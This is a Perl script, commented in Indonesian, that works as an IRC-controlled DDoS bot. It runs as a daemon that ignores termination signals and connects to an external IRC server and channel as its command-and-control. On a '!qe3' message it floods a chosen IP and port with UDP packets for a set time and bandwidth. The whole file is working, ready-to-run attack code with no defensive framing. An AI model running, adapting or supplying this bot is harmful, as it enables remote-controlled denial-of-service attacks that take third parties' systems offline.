#!/usr/bin/perl

use strict;
use warnings;
use IO::Socket::INET;
use POSIX qw(setsid);
use Socket;
use Getopt::Long;
use Time::HiRes qw(usleep gettimeofday);

# Informasi server dan channel
my $server = 'irc.ongisnade.co.id';
my $port = 7000;
my $nick = generate_random_nick();
my $channel = '#surabayacity';

# Mengabaikan sinyal SIGINT dan SIGHUP
$SIG{INT} = 'IGNORE';
$SIG{HUP} = 'IGNORE';
$SIG{TERM} = 'IGNORE';

# Fungsi untuk membuat nickname acak
sub generate_random_nick {
    my @chars = ('A'..'Z', 'a'..'z', '0'..'9');
    my $nick = '';
    $nick .= $chars[rand @chars] for 1..8; # Panjang nickname 8 karakter
    return $nick;
}

# Fork proses dan menjadi daemon
my $pid = fork();
if ($pid) {
    exit 0;
} elsif (defined $pid) {
    setsid();
    umask 0;
    chdir '/';
} else {
    die "Tidak dapat fork: $!";
}

# Membuat koneksi socket ke server IRC
my $socket = IO::Socket::INET->new(
    PeerAddr => $server,
    PeerPort => $port,
    Proto    => 'tcp'
) or die "Tidak dapat terhubung ke server $server:$port $!";

print "Terhubung ke server $server:$port dengan nickname $nick\n";

# Fungsi untuk mengirim data ke server IRC
sub send_irc {
    my ($msg) = @_;
    print $socket "$msg\r\n";
    print ">> $msg\n";
}

# Mengirim informasi login
send_irc("NICK $nick");
send_irc("USER $nick 8 * :Simple IRC Bot");

# Fungsi untuk menangani input dari server IRC
sub handle_server_input {
    while (my $input = <$socket>) {
        print "<< $input";
        if ($input =~ /^PING\s+(.*)$/i) {
            send_irc("PONG $1");
        }
        elsif ($input =~ /001\s+$nick\s+/) {
            send_irc("JOIN $channel");
        }
        elsif ($input =~ /PRIVMSG\s+$channel\s+:(.*)$/i) {
            my $message = $1;
            if ($message =~ /hello/i) {
                send_irc("PRIVMSG $channel :Hello, everyone!");
            }
            elsif ($message =~ /!qe3\s+(\S+)\s+--port=(\d+)\s+--size=(\d+)\s+--time=(\d+)\s+--delay=(\d+\.?\d*)\s+--bandwidth=(\d+)/i) {
                my ($target_ip, $port, $size, $time, $delay, $bw) = ($1, $2, $3, $4, $5, $6);
                start_ddos($target_ip, $port, $size, $time, $delay, $bw);
            }
        }
    }
}

# Fungsi untuk memulai serangan DDoS
sub start_ddos {
    my ($ip, $port, $size, $time, $delay, $bw) = @_;

    if ($bw && $delay) {
        print "WARNING: The package size overrides the parameter --the command will be ignored\n";
        $size = int($bw * $delay / 8);
    } elsif ($bw) {
        $delay = (8 * $size) / $bw;
    }

    $size = 700 if $bw && !$size;

    ($bw = int($size / $delay * 8)) if ($delay && $size);

    my ($iaddr, $endtime, $psize, $pport);
    $iaddr = inet_aton("$ip") or die "Cannot resolve the hostname: $ip\n";
    $endtime = time() + ($time ? $time : 1000000);
    socket(flood, PF_INET, SOCK_DGRAM, 17);

    printf "\e[0;32m>> Made by SamY from cqHack\n";
    printf "\e[0;31m>> Hitting the IP: %s\n", $ip;
    printf "\e[0;36m>> Hitting the port: %d\n", $port;
    print "Interpacket delay: $delay msec\n" if $delay;
    print "Total IP bandwidth: $bw kbps\n" if $bw;
    printf "\e[1;31m>> Press CTRL+C to stop the attack\n" unless $time;

    die "Invalid package size: $size\n" if $size && ($size < 64 || $size > 1500);
    $size -= 28 if $size;

    for (; time() <= $endtime;) {
        $psize = $size ? $size : int(rand(1024 - 64) + 64);
        $pport = $port ? $port : int(rand(65500)) + 1;

        send(flood, pack("a$psize", "flood"), 0, pack_sockaddr_in($pport, $iaddr));
        usleep(1000 * $delay) if $delay;
    }
}

# Memulai loop untuk menerima input dari server
handle_server_input();
